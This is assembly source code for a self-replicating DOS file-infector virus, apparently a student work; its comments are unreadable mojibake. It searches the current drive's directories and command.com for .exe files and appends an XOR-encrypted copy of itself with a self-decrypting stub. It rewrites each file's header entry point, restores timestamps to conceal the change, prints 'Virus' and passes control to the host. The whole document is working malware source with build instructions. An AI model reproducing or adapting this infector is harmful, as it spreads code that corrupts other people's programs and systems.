;���:		virus
;������:	���� � ���� (���-09)

;��� ����������
;tasm virus.asm /m2
;tlink virus.obj /t
 
.model tiny ;������ ������ - tiny, ��������� ���� - near, ��������� ������ - near, ������������ ������� - ms-dos, ����������� ���� � ������ - ���������
 
Code segment byte
assume cs:code,ds:code,es:code,ss:code
 
.386 ;��� 32-��������� �����������
 
org 100h ;���������� ��� com-������
 
 LEN		equ offset OFF - offset Entry
 Decriptor	equ offset EndDeCriptor - offset BeginDeCriptor
 DecSize	equ offset EndDeCriptor - offset Entry
 _IP		equ 14h
 _CS		equ 16h
 _SP		equ 10h
 _SS		equ 0eh
 PageCnt	equ 4h
 PartPag	equ 2h
 HdrSize    equ 8h
 DTATime    equ 16h
 DTADate    equ 18h
 
Entry:

push cs                         ;�������� cs (������� CS ��������� �� ������ ����� ������ ������� 64�)
mov bp,sp                       ;bp ������ �������� ������� ������� �����
mov bx,ss:[bp]                  ;bx = cs	                        
push bx                         ;�������� bx
pop ds                          ;�������� ds (������� DS ���������  ��  ������  ��������  ������)
                                
call $+3                        ;������� �������� ���� ������
Label1:                         
                                
pop bp                          ;�������� bp
sub bp,offset Label1            ;bp-�������� ��� ������->bp

;��������� ��������                             
BeginDeCriptor:                 
                                
cmp byte ptr[$+Decriptor],80h   
je DDD                          
                               
lea si,[EndDeCriptor + bp]     
mov cx,Len - DecSize - 2       
mov al,[Checker + bp]          
                               
add byte ptr [Cript + bp],30h   
                               
Cript:  db 00h,04h          ;���������������� ���   
        inc si                 
        loop Cript
		
;������������ ��� ��������  
EndDeCriptor:     
sub byte ptr [Cript + bp],30h  
DDD:                 
                             
mov [_ES + bp],es              
mov [Flag + bp],0               
push cs                        
pop es  
                              
;�������� ��� �������� ����� ��������� ��������                       
lea si,[IP_File + bp]          
lea di,[IP_ + bp]               
movsd                          
movsd                           
                               
call Main_Code                  ;�������� � �������� ����� ���������
                                
Exit:                           
int 20h                         ;��������� ���������
                               
;----------------------------------------------------------------------------
Main_Code proc near             
                                
mov byte ptr[InfectCount + bp],00h ;������� ���������
                               
;�������� ��� �����               
        mov ah,19h             
        int  21h   ;��� ����� �� ��������� ��� ���               
        push ax    ;�������� ax              
        add al,'A' ;������� � ����� ����� 'A', ����� �������� ��� ����� � ����� ACSII             
                                
 
	    mov [PATH + bp],al
        mov word ptr [PATH + 1 + bp],'\:'
                                
        cmp al,'A'              ;������� � 'A'
        jne Cur_Dir             ;���� ���, �� ���������
        add al,2                ;���� ��, �� �������                        
        jmp l                   ;�� ���� C
Cur_Dir:
 
;�������� ��� ����������
	mov ah,47h ;���� ������������ ���������� DOS
	pop dx     ;�������� dx
	inc dx     ;�������� �� 1
	lea si,[PATH + 3 + bp] ;�������� ����� �������� ����� � SI
	int 21h
 
l:	
	    lea si,[PATH + bp]
Next_Symbl: 
		lodsb ;�������� ������ ��� ������
	    cmp al,0 ;������� � 0
	    jne Next_Symbl ;���� �� 0, �� ������
		
	mov word ptr[_SI + bp],si ;SI ��� ����� ���� 
;������� ����� '*.exe' �� �����������
	mov dword ptr [si - 1],'e.*\'	
	mov word ptr [si + 3],'ex'
	mov byte ptr [si + 5],0 
 
	call WorkWithDir    ;��������� � ���� ����������
 
	call FindSubDir     ;��������� � �������������� 
 
;�������� command.com
	lea si,[Cmd + bp]
	lea di,[Path + bp]
	mov cx,15		;������ command.com = 15
	rep movsb       ;�������� ��� ���
	mov byte ptr [Flag + bp],1
	call InfectExe	;�������� � ��������� exe-����� 
 
	call CureEXE    ;�������� ���������
 
	retn
Main_Code endp
 

FindSubDir proc near
;�������� ����� ������������� 
;��������� DTADIR
	mov ah,1ah ;���������� ����� DTA
	lea dx,[DTADIR + bp] ;������� ����������
	int 21h
 
	mov word ptr[si],'.*'
	mov byte ptr[si + 2],0 
 
;������ ������
	lea dx,[PATH + bp] ;���� � dx
	mov cx,10h
	mov ah,4eh ;����� 1-� ����������� ����
	int 21h 
 
Next_Sub:	
;������ ���������
	mov ah,4fh ;����� ��������� ����������� ����
	lea dx,[DTADIR + bp] ;����� DTADIR
	int 21h
	jc NoSubDirs ;���� ������������� ���, �� ���������
	cmp [DTADIR + 1eh + bp],'.' ;���� ��� �������������?
	je Next_Sub ;��������� � ��� 
 
	mov di,[_SI + bp]
	lea si,[DTADIR + 1eh + bp]
l1:	
	lodsb ;�������� ������ � ������� 
	stosb ;� ������
	cmp al,0 ;����� 0?
	jne l1 ;���� ���, ���� ������
	
;������� ����� '*.exe' �� ����������� 
	mov dword ptr [di - 1],'e.*\'	
	mov word ptr [di + 3],'ex'
	mov byte ptr [di + 5],0
 
	mov si,di
 
	call WorkWithDir ;��������� � ��������� � ����������
 
;������������� DTADIR
	mov ah,1ah
	lea dx,[DTADIR + bp]
	int 21h	 
 
	jmp Next_Sub 
;���� ��� ������������� 
NoSubDirs:
 
	retn
FindSubDir endp	
 

WorkWithDir proc near	;������: PATH = Directory + *.exe
 
;������������ DTA
	mov ah,1ah
	lea dx,[DTA + bp]
	int 21h
 
;������� ������ ����
	lea dx,[PATH + bp]
	mov cx,10h
	mov ah,4eh
	int 21h
	jc _EX
 
Infect:
;��������	
	cmp [InfectCount + bp],3h ;��������� ������� ���������
	jae Not_Infect            ;���� ���������, �� ������������
 
	push si
	call InfectEXE            ;��������� � ���������
	pop si
Not_Infect:                
;���� �� �������, �� ���� ��������� ����
	mov ah,4fh
	lea dx,[DTA + bp]
	int 21h
	jc _EX  ;���� �� exe,�� �� �� ��������
	jmp Infect ;�������� ������
 
_EX:
	retn
WorkWithDir endp
 

InfectEXE proc near
;�������� ������ ���� �����
	cmp byte ptr [Flag + bp],1
	je Op ; ���� ���� �������� - ��������
 
	mov di,si
	lea si,[DTA + 1eh + bp]
l2:
	lodsb
	stosb
	cmp al,0
	jne l2	 
 
;��������� ���� ��� ������/������
Op:		
	mov ax,3d02h
	lea dx,[PATH + bp]
	int 21h
	jnc Opend
 
	retn
 
Opend: 
;��������� ���������
	xchg ax,bx	
	mov ah,3fh
	mov cx,1ch
	lea dx,[Header + bp]
	int 21h
 
;��� exe-����?
	cmp word ptr[Header + bp],'ZM'
	jne CloseF
	
;��� �������? 
	mov ax,4202h ;ah=42h - ���������� ��������� �����, al=02h - ����������� � ����� ����� + CX:DX
	mov cx,-1
	mov dx,-2
	int 21h
 
	mov ah,3fh ;������ ���� ����� ���������
	mov cx,2 ;CX = ����� ����������� ����
	lea dx,[CHK + bp] ;DS:DX = ����� ������ ��� ������ ������ 
	int 21h
 
	mov al,byte ptr[CHK + bp]
	add al,byte ptr[CHK + bp + 1]
	cmp al,0FFh ;��������� �� ������������
	je CloseF ;���� ��, �� ��������� ����
 
;�������� ������ �����
	mov ax,4202h ;���������� ��������� ����� � ����������� � ����� ����� + CX:DX 
	xor cx,cx ;��������
	xor dx,dx ;� ������������ � ����� �����
	int 21h
	push ax
	push dx
 
;�������� �� �������
	mov si,ax
	mov ax,word ptr[Header + PageCnt + bp]
	dec ax
	mov cx,512
	mul cx
	add ax,word ptr[Header + PartPag + bp]
	cmp ax,si
 
	jz M1 ;���� �� �������, �� ����������
	pop dx
	pop ax
	jmp CloseF ;����� ��������� ����
M1: 
	pop dx
	pop ax
 
	push ax
	push dx 
;��������� ����� ������ ����� � ����������
	add ax,Len
	adc dx,0
	mov cx,512
	div cx
	or dx,dx
	jz New_Len
	inc ax
New_len:
 
;��������� ������ ����� � ���������
	mov word ptr [Header + PageCnt + bp],ax
	mov word ptr [Header + PartPag + bp],dx
 
;���������� ���������� ��������� 
	lea si,[Header + _IP + bp]
	lea di,[IP_File + bp]
	movsw
	lea si,[Header + _CS + bp]
	lea di,[CS_File + bp]
	movsw
	lea si,[Header + _SS + bp]
	lea di,[SS_File + bp]
	movsw
	lea si,[Header + _SP + bp]
	lea di,[SP_File + bp]
	movsw 
 
;�������� ����� ����� �����
	pop dx
	pop ax 
 
	sub ax,100h
	mov cx,10h
	div cx
 
	add dx,100h
 
	sub ax,word ptr [Header + HdrSize + bp] 
 
	mov word ptr [Header + _CS + bp],ax
	mov word ptr [Header + _IP + bp],dx
	mov word ptr [Header + _SS + bp],ax
	mov word ptr [Header + _SP + bp],2000h
 
;���������� ������ ���������
	mov ax,4200h ;���������� ��������� ����� - LSEEK
	xor cx,cx
	xor dx,dx
	int 21h
 
	mov ah,40h ;������ � ���� ����� ���������
	lea dx,[Header + bp] ;�������� ����� ������ ���������
	mov cx,1ch ;28 ���� � ���������
	int 21h
 
;������� ��������	
	mov ah,2ch; ���� ����� DOS
	int 21h
    ;CH: ���� (0 �� 23)+ CL: ������ (0 �� 59)+ DH: ������� (0 �� 59)+ DL: ����� ���� ������� (0 �� 99) -> DL
	add dl,dh
	add dl,cl
	add dl,ch
 
	mov byte ptr[Checker + bp],dl ;������� ��������� �� ������
 
	mov al,255 ;255->al
	sub al,dl  ;al-dl->al
	mov byte ptr [Checker + bp + 1],al ;��������� ������� ��� �� ���� ������
 
;���������� ���� ������ � �����
	lea si,[Entry + bp]
	lea di,[Cripted + bp]
	mov cx,DecSize
 
l3:	
	rep
	movsb
  
;����������
	mov cx,LEN - DecSize - 2
 
l4: 
	lodsb
	xor al,[Checker + bp]
	stosb
	dec cx
	cmp cx,0
	jne l4
	movsw	
 
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h
 
	mov ah,40h
	lea dx,[Cripted + bp]
	mov cx,len
	int 21h 
 
	inc [InfectCount + bp]
	
CloseF: 
;������������� ���� �������� �������
	mov ax,5701h
	mov cx,word ptr [DTA + DTATime + bp]
	mov dx,word ptr [DTA + DTADate + bp]
	int 21h
 
;��������� ����
	mov ah,3eh
	int 21h 
 
	retn
 
InfectEXE endp

 
CureEXE proc near
;������� ���������� exe-�����
 
;������������ OLDDTA
	mov ah,1ah
	mov dx,80h
	int 21h	
;���������� � ����������� ����������
	cmp bp,0 
	jne ExT
 
	retn
ExT:
	cmp byte ptr [Checker + bp],0FCh
	jle NoMess
 
	mov ah,09h
	lea dx,[NM + bp]
	int 21h
 
NoMess:	
 
	mov ax,[_ES + bp]
	mov es,ax
 
	add ax,10h
	add word ptr [CS_ + bp],ax
 
	mov ax,word ptr[CS_ + bp]
	sub ax,10h
	mov ds,ax
 
	cli	;o������ ���� ����������� ���������� � �������� ������� (SREG)
	add ax,word ptr cs:[SS_ + bp]
	mov ss,ax
	mov sp,word ptr cs:[SP_ + bp]
	sti ;������������� ���� ���������� ����������
 
;�������� ��������
	xor ax,ax
   	xor bx,bx
	xor cx,cx
   	xor dx,dx
   	xor si,si
   	xor di,di
   	xor bp,bp
 
	db 0eah

;�������� ���������� IP,CS,SS,SP
EXEJump:   
	    IP_ dw 00h
	    CS_ dw 00h
	    SS_ dw 00h
	    SP_ dw 00h
 
 
CureEXE endp
 
 
;������
 
NM	db 'Virus',0Dh,0Ah,'$'
	db 'for ChitGU',0
Cmd	db 'c:\command.com',0
 
;�������� ������ �� ��������� ����� 
IP_File		dw 9090h
CS_File		dw 9090h
SS_File		dw 9090h
SP_File		dw 9090h
 
Checker		db 250
		    db 5
OFF:
_ES		    dw ?
_DS		    dw ?
_SI		    dw ?
InfectCount	db ?
Flag		db ?
AttrAndDate	db 5 dup (?)
DTA		    db 128 dup (?)
DTADIR		db 128 dup (?)
Header		db 1ch dup (?)
CHK		    dw ?
FULLPATH	db 100 dup (?)
PATH		db 100 dup (?)
Cripted		db ?
 
ends Code
end Entry

